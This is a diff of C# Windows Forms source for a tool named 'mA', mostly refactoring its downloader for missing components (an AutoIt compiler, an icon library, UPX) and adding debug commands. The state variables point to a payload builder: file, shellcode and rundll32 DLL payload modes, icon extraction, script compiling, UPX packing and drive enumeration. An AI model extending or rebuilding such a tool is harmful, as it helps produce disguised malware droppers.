@@ -1,17 +1,13 @@
-﻿#define isdbg //NOTE: DO NOT FORGET TO UNDEFINE (comment out) THIS ON RELEASE.
+﻿#define isdbg //NOTE: DO NOT FORGET TO UNDEFINE THIS ON RELEASE.
 using System;
-using System.Collections.Generic;
 using System.ComponentModel;
-using System.Data;
 using System.Drawing;
 using System.Linq;
-using System.Text;
 using System.Windows.Forms;
 using System.IO;
 using System.Diagnostics;
-using System.Net;
 using System.Drawing.IconLib;
-using System.Threading;
+using System.Net;
 //using System.Runtime.InteropServices;
 
 namespace masamangalternatibo {
@@ -23,15 +19,41 @@ namespace masamangalternatibo {
         int payloadMode = 0; // 0 = File payload // 1 = Shell Code payload // 2 = Load DLL to rundll32
         string[] payloadData = new string[5]; // Stores the data from the textbox so the user can switch modes without losing the last settings
         string[] payloadFile = new string[2]; // Stores the data of ofdPayload.FileName incase the user switches modes // 0 = File Payload // 1 = DLL Payload
-        bool[] excomp = { false, false }; // Acts as a switch if the external components exist or not // 0 = Icon Library // 1 = UPX
+        bool[] excomp = { false, false, false }; // Acts as a switch if the external components exist or not // 0 = Compiler // 1 = Icon Library // 2 = UPX
         int overflowCount = 20;
         string apth = Application.StartupPath;
-
+       
         private void Form1_Load(object sender, EventArgs e) {
             lblVersion.Text = "v" + version;
             dbgmsg("Starting from: " + apth);
+
+            excomp[0] = checkComponent(
+                "Compiler",
+                "compiler.exe",
+                "1.32mb",
+                "",
+                "The AutoIt compiler (compiler.exe) was not found, you cannot use mA with out the compiler as it needs to compile scripts to a standalone executables.",
+                true
+            );
+
+            excomp[1] = checkComponent(
+                "Icon Library",
+                "IconLib.dll",
+                "56.5kb",
+                "",
+                "The IconLib (IconLib.dll) Library was not found, some functions that are used by this application relies on this library file such as handling Icon conversion."
+            );
+
+            excomp[2] = checkComponent(
+                "Executable Compressor",
+                "upx.exe",
+                "356kb",
+                "",
+                "The UPX Compressor (upx.exe) was not found, This component is used to compress executable files to lessen their file size and is also utilized by the script compiler."
+            );
+
             loadDrives();
-            checkComponents();
+
             #if !(isdbg)
                 dbgmsg("Setting up...");
                 tbPayload.ReadOnly = true;
@@ -41,10 +63,12 @@ namespace masamangalternatibo {
                     _form.ShowDialog();
                 }
             #endif
+            dbgmsg("WARNING: Console Commands aren't filtered/check; They're executed directly and immidiately. Be cautious on executing commands.");
             dbgmsg("mA Ready! // Hover an item for more information!");
             #if isdbg
-            dbgmsg("mA is running in debugging mode!");
+            dbgmsg("mA is running in debugging mode");
             #endif
+            dbgmsg("NOTICE: mA is currently in a test phase release, please be aware of instability.");
         }
 
         #region [Console Commands]
@@ -52,13 +76,8 @@ namespace masamangalternatibo {
             string[] con = tbConsole.Text.Split(' ');
             switch ((con[0]).ToLower()) {
 
-                case "showpayloadfile":
-                    dbgmsg("payloadFile[0]=" + payloadFile[0]);
-                    dbgmsg("payloadFile[1]=" + payloadFile[1]);
-                    break;
-
                 case "owo":
-                    dbgmsg("OwO ~ what's this?");
+                    dbgmsg("what's this?");
                     break;
 
                 case "setdrive":
@@ -89,18 +108,79 @@ namespace masamangalternatibo {
                     dbgmsg("The quick brown fox jumps over the lazy dog The quick brown fox jumps over the lazy dog The quick brown fox jumps over the lazy dog The quick brown fox jumps over the lazy dog");
                     break;
 
+                case "showpayloadfile":
+                    dbgmsg("payloadFile[0]=" + payloadFile[0]);
+                    dbgmsg("payloadFile[1]=" + payloadFile[1]);
+                    break;
+
+                case "checkcomp": //Check the function documentation of "checkComponent" to know the debug arguments/parameters
+                    dbgmsg("Testing checkComponent() Function");
+                    dbgmsg("Test returned a value of: " + checkComponent(con[1], con[2], con[3], con[4], con[5]).ToString());
+                    break;
                 default:
-                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncls\nexit\n");
+                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncheckcomp [name] [filename] [size] [link] [desc]\ncls\nexit\n");
                     break;
             }
             tbConsole.Text = "";
         }
         #endregion
 
-        //Extract Icon Function - used to extract icons by utilizing the IconLib Library
+        /*
+         Check Component Function - Checks the external components of mA.
+         ------------------------------------------------------------------------------------------------- 
+         checkComponent(
+                Component Name,
+                File Name,
+                File Size,
+                Download Link,
+                Component Description,
+                Importance (Optional) | Value: false = Optional Component, true = Important Component
+         )
+         -------------------------------------------------------------------------------------------------
+         *returns: true = The component exists / has been downloaded, false = The component doesn't exist
+        */
+        public bool checkComponent(string name, string flname, string flsize, string dllink, string desc, bool importance = false) {
+            bool rbool = false;
+            if (File.Exists(flname) != true) {
+                if (MessageBox.Show("An " + (importance ? "important" : "optional") + " component is missing!\n\n" + desc + "\n\nDownload File: \"" + flname + "\" (" + flsize + ")?\nDownload Link: " + dllink + "\n\nThis will be done in the background.", "Component Missing: " + name + " | \"" + flname + "\" (" + flsize + ")!", MessageBoxButtons.YesNo) == DialogResult.Yes) {
+                    try {
+                        using (WebClient _wc = new WebClient()) {
+                            _wc.DownloadFile(dllink, flname);
+                        }
+                        MessageBox.Show("Download Complete!");
+                        rbool = true;
+                    }
+                    catch {
+                        rbool = false;
+                        MessageBox.Show("Component download failed!", "Download Fail!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        if (importance) {
+                            Application.Exit();
+                        }
+                    }
+                }
+                else {
+                    rbool = false;
+                }
+            }
+            else {
+                rbool = true;
+            }
+            return rbool;
+        }
+
+        /*
+         Extract Icon Function - used to extract icons by utilizing the IconLib Library.
+         ----------------------------------------------------------------------------------
+         extractIcon(
+                Boolean Value,
+                File to extract the Icon from
+         )
+         ----------------------------------------------------------------------------------
+         *fromButton suppresses error if it wasn't the users' intention to extract an icon
+         *returns: nothing
+        */
         private void extractIcon(bool fromButton = false, string iconfile = "") {
-            //fromButton supresses error if it wasn't the users' intention to extract an icon
-            if (excomp[0] && iconfile != "") {
+            if (excomp[1] && iconfile != "") {
                 dbgmsg("Extracting associated icon to bitmap...");
                 (Icon.ExtractAssociatedIcon(iconfile).ToBitmap()).Save(apth + "\\_bmptmp.bmp");
                 MultiIcon conico = new MultiIcon();
@@ -121,7 +201,15 @@ namespace masamangalternatibo {
             }
         }
 
-        //Trim Extension Function - Removes the file extension from a string
+        /*
+         Trim Extension Function - Removes the file extension from a string.
+         -------------------------------------------------------------------
+         trimexit(
+                String to trim
+         )
+         -------------------------------------------------------------------
+         *returns: string (Trimmed input)
+        */
         private string trimext(string flname) {
             string[] aa = flname.Split('.');
             string tmp = "";
@@ -131,87 +219,7 @@ namespace masamangalternatibo {
             return tmp;
         }
 
-        //TODO: rework file checking. use recursion and arrays to check the files instead of separate ones
-        //Check Component Function - Checks the required external components of mA
-        #region Check Components
-        private void checkComponents() {
-            // TODO: Get proper host
-            string dl1 = ""; //Link for the Compiler
-            string dl2 = ""; //Link for the Library
-            string dl3 = ""; //Link for the Compressor
-
-            //Check for the Compiler
-            dbgmsg("Checking for compiler...");
-            if (!(File.Exists("compiler.exe"))) {
-                if (MessageBox.Show("An important component of mA is missing!\n\nThe AutoIt compiler (compiler.exe) was not found, you cannot use mA with out the compiler as it needs to compile scripts to standalone executables.\n\nPressing Yes will download the compiler from this link\n" + dl1 + "\n\nThis will be downloaded in the background.", "Script compiler missing! // Download component \"compiler.exe\" (1.32mb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
-                    dbgmsg("Downloading file...");
-                    using (WebClient _wc = new WebClient()) {
-                        _wc.DownloadFile(dl1, "compiler.exe");
-                    }
-                    dbgmsg("Download complete!");
-                    MessageBox.Show("Download complete!", "Download component \"compiler.exe\" (1.32mb)");
-                }
-                else {
-                    dbgmsg("Application cannot function without compiler... Exiting!");
-                    using (about _form = new about()) { _form.Close(); }
-                    Application.Exit();
-                    return;
-                }
-            }
-            else {
-                dbgmsg("compiler.exe found.");
-            }
-
-            //Check for the Icon Library
-            dbgmsg("Checking for IconLib...");
-            if (!(File.Exists("IconLib.dll"))) {
-                if (MessageBox.Show("An important component of mA is missing!\n\nThe IconLib (IconLib.dll) Library was not found, some functions that are used by this application relies on this library file such as handling Icon conversion.\n\nPressing Yes will download the Library from this link\n" + dl2 + "\n\nThis will be downloaded in the background.", "Library missing! // Download component \"IconLib.dll\" (56.5kb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
-                    dbgmsg("Downloading file...");
-                    using (WebClient _wc = new WebClient()) {
-                        _wc.DownloadFile(dl2, "IconLib.dll");
-                    }
-                    dbgmsg("Download complete!");
-                    MessageBox.Show("Download complete!", "Download component \"IconLib.dll\" (56.5kb)");
-                    excomp[0] = true;
-                }
-                else {
-                    excomp[0] = false;
-                    dbgmsg("WARNING: IconLib.dll is missing, some functions won't work without it.");
-                    return;
-                }
-            }
-            else {
-                excomp[0] = true;
-                dbgmsg("IconLib.dll found.");
-            }
-
-            //Check for the Compressor
-            dbgmsg("Checking for UPX...");
-            if (!(File.Exists("upx.exe"))) {
-                if (MessageBox.Show("An optional component of mA is missing!\n\nThe UPX Compressor (upx.exe) was not found, This component is used to compress executable files to lessen their file size and is also utilized by the compiler.\n\nPressing Yes will download the component from this link\n" + dl3 + "\n\nThis will be downloaded in the background.", "Compressor missing! // Download component \"upx.exe\" (356kb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
-                    dbgmsg("Downloading file...");
-                    using (WebClient _wc = new WebClient()) {
-                        _wc.DownloadFile(dl2, "upx.exe");
-                    }
-                    dbgmsg("Download complete!");
-                    MessageBox.Show("Download complete!", "Download component \"upx.exe\" (356kb)");
-                    excomp[1] = true;
-                }
-                else {
-                    excomp[1] = false;
-                    dbgmsg("WARNING: upx.exe is missing, some functions won't work without it.");
-                    return;
-                }
-            }
-            else {
-                excomp[1] = true;
-                dbgmsg("upx.exe found.");
-            }
-
-        }
-        #endregion
-
-        //ghetto title bar management
+        //Ghetto Title bar management
         #region Title Bar
         private void titlebar_MouseMove(object sender, MouseEventArgs e) {
             if (e.Button == MouseButtons.Left) {
@@ -226,11 +234,19 @@ namespace masamangalternatibo {
         }
         #endregion
 
-        //Debug Message Function - Function to be utilized to output messages in the debug console prepend form
+        /*
+         Debug Message Function - Function to be utilized to output messages in the debug console prepend form.
+         --------------------------------------------------------------------------------------------------------
+         dbgmsg(
+                Debug Message
+         )
+         --------------------------------------------------------------------------------------------------------
+         *An if logic is implemented to prevent the debug label from overflowing beyond the tool strip container
+         *returns: nothing
+        */
         private void dbgmsg(string a) {
-            dbgRtb.Text = a + "\n" + dbgRtb.Text;
-
-            if (a.Length >= 70) { //To prevent the debug label on overflowing beyond the tool strip container
+            dbgRtb.Text = "•" + a + "\n" + dbgRtb.Text;
+            if (a.Length >= 70) {
                 lblDbg.Text = a.Remove(70, a.Length - 70) + "...";
             }
             else {
@@ -238,6 +254,27 @@ namespace masamangalternatibo {
             }
         }
 
+        /*
+         Open Miniature Notepad Function - a function to open the MiniPad Window
+         --------------------------------------------------------------------------
+         openminipad(
+                Script edit write mode (bool)
+         )
+         --------------------------------------------------------------------------
+         *Two or more instances uses the same code with small change of detail.
+         *returns: nothing
+        */
+        private void openminipad(bool writemode = false) {
+            minipad _minipad = new minipad();
+            _minipad.btnPassShell.Enabled = false;
+            _minipad.btnCompileScript.Enabled = false;
+            if (payloadMode == 2) { _minipad.btnPassShell.Enabled = true; }
+            if (writemode) { _minipad.btnCompileScript.Enabled = true; _minipad.btnPassShell.Enabled = false; }
+            _minipad.Show();
+        }
+
+        //TODO: Add checking if drive is available, exclude network folders, (option) use a flash drive library.
+        //Load Drives Function - Detects all the present drives in this computer by scanning directories.
         private void loadDrives() {
             dbgmsg("Detecting drives...");
             drpDrives.Items.Clear();
@@ -364,6 +401,7 @@ namespace masamangalternatibo {
 
         private void ofdIcon_FileOk(object sender, CancelEventArgs e) {
             dbgmsg("Copying as temporary file...");
+            if (File.Exists("$tmp.ico")) { File.Delete("$tmp.ico"); }
             File.Copy(ofdIcon.FileName, "$tmp.ico");
             dbgmsg("Loading image...");
             imgFileIcon.ImageLocation = "$tmp.ico";
@@ -375,8 +413,11 @@ namespace masamangalternatibo {
         }
 
         private void btnMiniPad_Click(object sender, EventArgs e) {
-            minipad _minipad = new minipad();
-            _minipad.Show();
+            openminipad();
+        }
+
+        private void btnWrite_Click(object sender, EventArgs e) {
+            openminipad(true);
         }
     }
 }
